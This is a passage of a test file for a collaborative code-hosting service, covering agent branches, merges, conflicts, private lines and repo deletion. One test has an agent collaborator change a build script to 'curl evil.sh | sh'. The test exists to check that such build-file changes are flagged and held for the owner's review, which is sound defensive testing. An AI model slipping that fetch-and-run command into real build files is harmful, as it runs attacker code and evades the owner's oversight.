    expect((await call(null, `/api/shares/${id}`)).status).toBe(404);
  });

  test("an agent works on a branch, and the owner reviews and merges it", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "one\ntwo\nthree" });
    expect((await post(call, "bo", "/api/repos/ana/r/branches", { name: "tidy" })).status).toBe(403);
    expect((await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "tidy" })).status).toBe(201);
    const on = "/api/repos/ana/r/do", q = "?path=a.js&branch=tidy";
    const ops = (user: string, query: string, o: unknown[]) => post(call, user, `${on}/ops${query}`, { ops: o });

    // The branch's copy starts as main's, ids and revs included.
    expect((await (await call("agent-a", `${on}/file${q}`)).json() as Doc).lines.map((l) => l.id)).toEqual(["L1", "L2", "L3"]);
    expect((await ops("agent-a", q, [{ kind: "set", line: "L2", base: 2, text: "TWO" }, { kind: "insert", after: "L3", text: "four" }])).status).toBe(200);
    expect((await post(call, "agent-a", "/api/repos/ana/r/files", { path: "new.js", content: "fresh", branch: "tidy" })).status).toBe(201);
    // Main moves on meanwhile, on another line and on the same one.
    await ops("ana", "?path=a.js", [{ kind: "set", line: "L1", base: 1, text: "ONE" }, { kind: "set", line: "L3", base: 3, text: "3" }]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("ONE\ntwo\n3");

    expect((await post(call, "ana", "/api/repos/ana/r/do/merge?path=a.js", {})).status).toBe(404);
    expect((await post(call, "ana", `${on}/commit${q}`, {})).status).toBe(400);
    const review = await (await call("ana", "/api/repos/ana/r/branches/tidy")).json() as any;
    expect(review.files.map((f: any) => [f.path, f.ops.length, f.conflicts.length])).toEqual([["a.js", 2, 0], ["new.js", 1, 0]]);
    expect((await post(call, "ana", "/api/repos/ana/r/branches/tidy/merge", {})).status).toBe(200);
    const main = await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc;
    expect(main.lines.map((l) => `${l.by}:${l.text}`)).toEqual(["ana:ONE", "agent-a:TWO", "ana:3", "agent-a:four"]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=new.js")).json() as Doc)).toBe("fresh");
    expect((await (await call("ana", "/api/repos/ana/r/branches")).json() as any[])[0]).toMatchObject({ name: "tidy", status: "merged", merged_by: "ana" });
    // A merged branch takes no more edits.
    expect((await ops("agent-a", q, [{ kind: "insert", after: null, text: "late" }])).status).toBe(404);
  });

  test("a merge with a conflict lands nothing until each line is settled", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "x\ny" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "b.js", content: "z" });
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "b1" });
    const opsOn = (query: string, o: unknown[]) => post(call, "ana", `/api/repos/ana/r/do/ops${query}`, { ops: o });
    await opsOn("?path=a.js&branch=b1", [{ kind: "set", line: "L1", base: 1, text: "branch" }]);
    await opsOn("?path=b.js&branch=b1", [{ kind: "set", line: "L1", base: 1, text: "Z" }]);
    await opsOn("?path=a.js", [{ kind: "set", line: "L1", base: 1, text: "main" }]);

    const r = await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", {});
    expect(r.status).toBe(409);
    expect((await r.json() as any).conflicts).toEqual([{ path: "a.js", conflicts: [{ line: "L1", base: "x", main: "main", branch: "branch" }] }]);
    // Not even the clean file landed.
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=b.js")).json() as Doc)).toBe("z");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", { resolve: { "a.js": { L1: "branch" } } })).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("branch\ny");
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=b.js")).json() as Doc)).toBe("Z");
  });

  test("a merge that would leave code that doesn't build waits, and says why", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.ts", content: "const x = 1;\nlog(x);" });
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "b1" });
    const opsOn = (query: string, o: unknown[]) => post(call, "ana", `/api/repos/ana/r/do/ops${query}`, { ops: o });
    // Each side declares the same new name in a different place: each builds alone, merged it's declared twice.
    await opsOn("?path=a.ts&branch=b1", [{ kind: "insert", after: null, text: "const y = 2;" }]);
    await opsOn("?path=a.ts", [{ kind: "insert", after: "L2", text: "const y = 3;" }]);
    const review = await (await call("ana", "/api/repos/ana/r/branches/b1")).json() as any;
    expect(review.files[0].conflicts).toEqual([{ line: "lint:redeclared:y", base: "", main: null, branch: null, lint: "`y` is declared twice (line 4)" }]);
    const r = await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", {});
    expect(r.status).toBe(409);
    expect((await r.json() as any).error).toBe("merged, it wouldn't build: a.ts: `y` is declared twice (line 4)");
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.ts")).json() as Doc)).toBe("const x = 1;\nlog(x);\nconst y = 3;");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", { resolve: { "a.ts": { "lint:redeclared:y": "branch" } } })).status).toBe(200);
  });

  test("private lines in a public repo: the crew reads them, everyone else, git and search get them blank", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "pub" });
    await post(call, "ana", "/api/repos/ana/pub/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/pub/files", { path: "a.ts", content: "one\nkey = hunter2\nthree" });
    const on = "/api/repos/ana/pub/do", q = "?path=a.ts";
    const read = async (who: string | null, route = "file", query = q) => (await (await call(who, `${on}/${route}${query}`)).json()) as any;
    const mark = (who: string, lines: string[], private_ = true) => post(call, who, `${on}/private${q}`, { lines, private: private_ });

    expect((await mark("bo", ["L2"])).status).toBe(403);
    expect((await post(call, "ana", `${on}/private${q}&branch=x`, { lines: ["L2"], private: true })).status).toBe(404);
    expect((await mark("ana", ["L2"])).status).toBe(200);
    // Outside the crew: a placeholder, in its place.
    expect((await read("bo")).lines.map((l: any) => [l.id, l.text, !!l.private])).toEqual([["L1", "one", false], ["L2", "", true], ["L3", "three", false]]);
    expect((await read(null)).lines[1].text).toBe("");
    expect((await read("agent-a")).lines[1]).toMatchObject({ text: "key = hunter2", private: true });

    // Edited, it stays private, and blame and time travel don't give it away.
    await post(call, "ana", `${on}/ops${q}`, { ops: [{ kind: "set", line: "L2", base: 2, text: "key = hunter3" }] });
    expect((await read("ana")).lines[1]).toMatchObject({ text: "key = hunter3", private: true });
    expect(JSON.stringify([await read("bo", "log"), await read("bo", "at", q + "&rev=3")])).not.toContain("hunter");

    // Git and search get the blank line; the crew still reads the real one.
    expect((await post(call, "ana", `${on}/commit${q}`, { message: "c" })).status).toBe(200);
    const repo = await call.artifacts.get("ana--pub");
    expect(await (await repo.readFile({ ref: "main", path: "a.ts" }))!.text()).toBe("one\n\nthree\n");
    expect(await (await call("ana", "/api/search?q=hunter3")).json()).toEqual([]);
    expect((await (await call("ana", "/api/search?q=three")).json() as any[]).length).toBe(1);

    // Shares and playlists read it as their reader may.
    const { id } = await (await post(call, "ana", "/api/repos/ana/pub/shares", { path: "a.ts", from: 1, to: 3 })).json() as any;
    expect((await (await call(null, `/api/shares/${id}`)).json() as any).lines.map((l: any) => l.text)).toEqual(["one", "", "three"]);
    const pl = await (await post(call, "bo", "/api/playlists", { title: "mine" })).json() as any;
    await post(call, "bo", `/api/playlists/${pl.id}/tracks`, { owner: "ana", repo: "pub", path: "a.ts", from: 1, to: 3 });
    expect((await (await call("bo", `/api/playlists/${pl.id}`)).json() as any).tracks[0].lines.map((l: any) => l.text)).toEqual(["one", "", "three"]);

    // A branch's copy hides the same lines, and lines marked after it forked.
    await post(call, "agent-a", "/api/repos/ana/pub/branches", { name: "b" });
    await post(call, "agent-a", `${on}/ops${q}&branch=b`, { ops: [{ kind: "set", line: "L2", base: 4, text: "key = hunter4" }] });
    await mark("ana", ["L1"]);
    expect((await read("bo", "file", q + "&branch=b")).lines.map((l: any) => l.text)).toEqual(["", "", "three"]);
    const review = await (await call("bo", "/api/repos/ana/pub/branches/b")).json() as any;
    expect(JSON.stringify(review)).not.toContain("hunter");
    expect(JSON.stringify(await (await call("ana", "/api/repos/ana/pub/branches/b")).json())).toContain("hunter4");

    // Public again.
    await mark("ana", ["L1", "L2"], false);
    expect((await read("bo")).lines.map((l: any) => l.text)).toEqual(["one", "key = hunter3", "three"]);
  });

  test("a branch that changes build or deploy files says so, and a merge that would ship waits for the owner to read it", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "package.json", content: '{\n  "scripts": { "build": "vite build" }\n}' });
    await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "sneaky" });
    await post(call, "agent-a", "/api/repos/ana/r/do/ops?path=package.json&branch=sneaky", { ops: [{ kind: "set", line: "L2", base: 2, text: '  "scripts": { "build": "curl evil.sh | sh" }' }] });
    await post(call, "agent-a", "/api/repos/ana/r/files", { path: "src/a.js", content: "fine", branch: "sneaky" });

    const review = await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any;
    expect(review.deploys).toBe(false);
    expect(review.files.map((f: any) => [f.path, f.build])).toEqual([["package.json", true], ["src/a.js", false]]);
    expect(review.files[0].lines).toEqual(['-   "scripts": { "build": "vite build" }', '+   "scripts": { "build": "curl evil.sh | sh" }']);
    expect(review.files[1].lines).toBeUndefined();

    // Once the owner's commit to main ships, the merge needs build_ok.
    expect((await call("ana", "/api/repos/ana/r/deploy", { method: "PUT", body: JSON.stringify({ on_commit: true }) })).status).toBe(200);
    expect((await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any).deploys).toBe(true);
    const no = await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", {});
    expect(no.status).toBe(409);
    expect((await no.json() as any).build).toEqual(["package.json"]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("vite build");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("curl evil.sh");
  });

  test("build and deploy files are told apart from the rest", () => {
    for (const p of ["package.json", "web/package.json", "bun.lock", "pnpm-lock.yaml", "rustybuns.config.ts", "wrangler.jsonc", ".rustybuns/state.json", "alchemy.run.ts", "Dockerfile", "api/Dockerfile.prod", "build.ts", "vite.config.mjs", ".github/workflows/ci.yml", ".gitlab-ci.yml"]) expect([p, isBuildFile(p)]).toEqual([p, true]);
    for (const p of ["src/build.tsx", "README.md", "src/package.ts", "docs/wrangler.md", "test/vite.config.test.ts"]) expect([p, isBuildFile(p)]).toEqual([p, false]);
  });

  test("the owner flips a repo public or private", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "dig", visibility: "private" });
    const put = (who: string, v: string) => call(who, "/api/repos/ana/dig", { method: "PUT", body: JSON.stringify({ visibility: v }) });
    expect((await call("bo", "/api/repos/ana/dig")).status).toBe(404);
    expect((await put("bo", "public")).status).toBe(404);
    expect((await put("ana", "public")).status).toBe(200);
    expect((await call("bo", "/api/repos/ana/dig")).status).toBe(200);
  });

  test("the owner deletes a repo, once its name is typed back: rows, files, branches, cuts, shares and git", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "gone" });
    await post(call, "ana", "/api/repos/ana/gone/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/gone/files", { path: "a.ts", content: "export const one = 1;\nexport const two = one + 1;\n" });
    await post(call, "ana", "/api/repos/ana/gone/do/commit?path=a.ts", { message: "first" });
    await post(call, "ana", "/api/repos/ana/gone/branches", { name: "tidy" });
    const share = (await (await post(call, "ana", "/api/repos/ana/gone/shares", { path: "a.ts", from: 1, to: 2 })).json()) as any;
    const cut = await post(call, "ana", "/api/repos/ana/gone/cuts", { pieces: [{ path: "a.ts", from: 2, to: 2 }] });
    expect(cut.status).toBe(201);
    const { artifact } = (await call.env.DB.prepare("SELECT artifact FROM repos WHERE owner = 'ana' AND name = 'gone'").first()) as any;
    expect(artifact).toBeTruthy();

    const del = (who: string, q = "?confirm=gone") => call(who, `/api/repos/ana/gone${q}`, { method: "DELETE" });
    expect((await del("agent-a")).status).toBe(403);   // crew can't
    expect((await del("bo")).status).toBe(403);
    expect((await del("ana", "")).status).toBe(400);   // not without its name
    expect((await del("ana", "?confirm=other")).status).toBe(400);
    expect(await (await del("ana")).json()).toEqual({ deleted: "ana/gone" });

    expect((await call("ana", "/api/repos/ana/gone")).status).toBe(404);
    expect((await call(null, `/api/shares/${share.id}`)).status).toBe(404);
    for (const t of ["files", "branches", "branch_files", "collaborators", "shares", "cuts", "file_search"]) {
      expect(await call.env.DB.prepare(`SELECT count(*) AS n FROM ${t} WHERE owner = 'ana' AND repo = 'gone'`).first()).toEqual({ n: 0 });
    }
    // The name is free again, and starts empty: the file's Durable Object was wiped, and the git went too.
    expect((await post(call, "ana", "/api/repos", { name: "gone" })).status).toBe(201);
    expect(((await (await call("ana", "/api/repos/ana/gone/do/file?path=a.ts")).json()) as any).lines ?? []).toEqual([]);
    expect(((await (await call("ana", "/api/repos/ana/gone/tree")).json()) as any).entries).toEqual([]);
  });
});
